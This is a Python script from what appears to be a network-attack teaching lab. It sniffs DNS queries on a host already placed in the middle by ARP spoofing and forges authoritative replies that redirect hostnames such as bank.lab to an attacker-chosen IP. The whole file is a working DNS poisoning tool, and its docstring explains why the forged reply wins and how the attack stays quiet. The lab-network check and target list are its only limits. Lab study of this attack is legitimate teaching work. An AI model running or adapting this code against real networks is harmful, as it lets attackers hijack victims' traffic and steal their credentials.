#!/usr/bin/env python3
"""
attacker/dns_spoof.py
=====================

Step 3 of the attack chain — DNS reply forgery.

Pre-conditions
--------------
You must already be sitting in the middle of the victim's traffic, i.e.
arp_spoof.py is running, so the victim's UDP/53 packets to the gateway
arrive at THIS host first.  Without that, the victim's queries never
touch us and there is nothing to forge.

What we do
----------
Scapy sniffs every UDP/53 packet on the chosen interface.  For each one
that is a query (DNS qr=0) for a name in our --targets list, we:

  1. Pluck the query ID and the question section out of the packet.
  2. Build a reply with the SAME ID and question, plus an answer
     section that points the name at --answer-ip (default: attacker IP).
  3. Spray the reply back from the victim's gateway IP/MAC so it looks
     like it came from the real DNS server.

Why the race usually works
--------------------------
The victim only accepts the first reply it sees for a given query ID.
We are sitting in the middle, so we observe the query before the real
DNS server even gets it — we win the race by physics, not luck.

Why we still let the real query through (ip_forward=1)
------------------------------------------------------
If we drop the original query, the next time the victim's resolver
times out it may retry over TCP or warn the user.  By letting the real
query through we get a second copy of the answer arriving a few ms
late, which the victim silently ignores because our forgery was first.
That is one of the reasons DNS poisoning is so quiet.

Safety / scope
--------------
* Only spoofs names explicitly listed in --targets (default: bank.lab,
  mail.lab, intranet.lab).  Everything else passes through unmolested.
* Refuses to run if --answer-ip is outside the lab network.
"""

from __future__ import annotations

import argparse
import signal
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from shared import config, colors                       # noqa: E402
from shared.network_utils import assert_lab_network, require_root  # noqa: E402

try:
    from scapy.all import (                             # type: ignore
        DNS, DNSQR, DNSRR, IP, UDP, Ether, sniff, sendp,
    )
except ImportError:
    colors.die("scapy is required: pip3 install scapy")


_stop = False


def _normalise(name: str) -> str:
    """DNS queries arrive as b'bank.lab.' — strip dot, lower-case."""
    return name.rstrip(".").lower()


def make_handler(targets: set[str],
                 answer_ip: str,
                 iface: str,
                 ttl: int) -> "callable":
    """
    Build the per-packet callback used by scapy.sniff().

    We close over `targets`, `answer_ip`, etc. so the inner function
    has only one argument — the packet — which is what sniff() expects.
    """

    def handler(pkt) -> None:
        # Fast filter: we only care about DNS *queries* (qr=0) that have
        # at least one question and arrive as UDP/53.
        if not pkt.haslayer(DNS) or pkt[DNS].qr != 0 or pkt[DNS].qdcount < 1:
            return

        qname = _normalise(pkt[DNSQR].qname.decode(errors="ignore"))
        if qname not in targets:
            return  # not interesting — let it through to the real resolver

        colors.step(f"Sniffed query for {qname!r} (id={pkt[DNS].id})")

        # ------------------------------------------------------------------
        # Forge a reply.  Notice that we SWAP src/dst at L2/L3/L4 so the
        # reply looks like it came from the DNS server the victim asked.
        # ------------------------------------------------------------------
        forged = (
            Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)
            / IP(src=pkt[IP].dst,     dst=pkt[IP].src)
            / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
            / DNS(
                id=pkt[DNS].id,       # CRITICAL — must echo query ID
                qr=1,                  # this is a response
                aa=1,                  # "authoritative" — looks legit
                qd=pkt[DNS].qd,        # echo the question back verbatim
                an=DNSRR(
                    rrname=pkt[DNSQR].qname,
                    ttl=ttl,
                    rdata=answer_ip,
                ),
            )
        )
        sendp(forged, iface=iface, verbose=False)
        colors.ok(f"Forged A {qname} -> {answer_ip} (ttl={ttl})")

    return handler


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="DNS query sniffer + reply forger (Module 5 lab).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--iface",     default=config.DEFAULT_IFACE)
    p.add_argument("--answer-ip", default=config.DNS_SPOOF_ANSWER_IP,
                   help="IP to return for every spoofed hostname")
    p.add_argument("--targets",   nargs="+",
                   default=list(config.TARGET_HOSTNAMES),
                   help="Hostnames to spoof (anything else passes through)")
    p.add_argument("--ttl",       type=int, default=config.DNS_TTL_SEC,
                   help="TTL on the forged answer; short = lively demo")
    return p.parse_args()


def main() -> None:
    args = parse_args()
    colors.banner("attacker/dns_spoof.py", role="ATTACKER / DNS FORGER")

    assert_lab_network(args.answer_ip)
    require_root("attacker/dns_spoof.py")

    targets = {_normalise(t) for t in args.targets}
    colors.info(f"Iface     : {args.iface}")
    colors.info(f"Answer IP : {args.answer_ip}")
    colors.info(f"Targets   : {', '.join(sorted(targets))}")
    colors.info(f"TTL       : {args.ttl}s")
    colors.warn("Make sure arp_spoof.py is already running, or there will "
                "be no DNS traffic for us to see.")

    handler = make_handler(targets, args.answer_ip, args.iface, args.ttl)

    # Ctrl-C: tell sniff() to stop by setting a flag scapy can check.
    def _sig(signum, _frame):
        global _stop
        _stop = True
        colors.warn(f"Caught signal {signum} — stopping sniffer")
    signal.signal(signal.SIGINT,  _sig)
    signal.signal(signal.SIGTERM, _sig)

    colors.step(f"Sniffing UDP/53 on {args.iface} — Ctrl-C to stop")
    # BPF "udp port 53" restricts sniff to DNS traffic at the kernel
    # level, which is much cheaper than filtering in Python.
    sniff(
        iface=args.iface,
        filter="udp port 53",
        prn=handler,
        store=False,
        stop_filter=lambda _pkt: _stop,
    )
    colors.ok("DNS spoofer stopped.")


if __name__ == "__main__":
    main()
